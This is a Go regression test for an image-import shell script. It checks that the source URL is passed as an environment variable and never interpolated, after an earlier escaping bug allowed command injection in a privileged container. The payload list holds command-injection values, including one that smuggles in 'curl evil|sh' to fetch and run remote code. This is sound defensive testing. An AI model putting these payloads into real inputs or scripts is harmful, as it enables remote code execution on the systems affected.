package swiftimage

import "strings"

import "testing"

// The source URL must never appear in the script text. It is delivered as an
// env var and dereferenced as "$SOURCE_URL", so shell metacharacters in it are
// inert: the shell does not re-scan the value of a variable it expands.
//
// Regression: the script was built with fmt.Sprintf("%q"), which escapes " and
// \ but NOT $ or backticks — and the result sat inside shell double quotes, so
// a URL like https://x/$(id) executed inside a root, privileged container.
func TestImportScript_DoesNotInterpolateSourceURL(t *testing.T) {
	payloads := []string{
		`https://x/$(id>/tmp/pwned)`,
		"https://x/`whoami`",
		`https://x/${IFS}evil`,
		`https://x/"; curl evil|sh; echo "`,
	}
	for _, format := range []string{"qcow2", "raw"} {
		for _, osType := range []string{"linux", "windows"} {
			script := importScript(format, osType)
			for _, p := range payloads {
				if strings.Contains(script, p) {
					t.Errorf("format=%s os=%s: script interpolates the URL %q", format, osType, p)
				}
			}
			// It must dereference the env var instead.
			if !strings.Contains(script, `"$`+importSourceURLEnv+`"`) {
				t.Errorf("format=%s os=%s: script does not read $%s: %s", format, osType, importSourceURLEnv, script)
			}
		}
	}
}
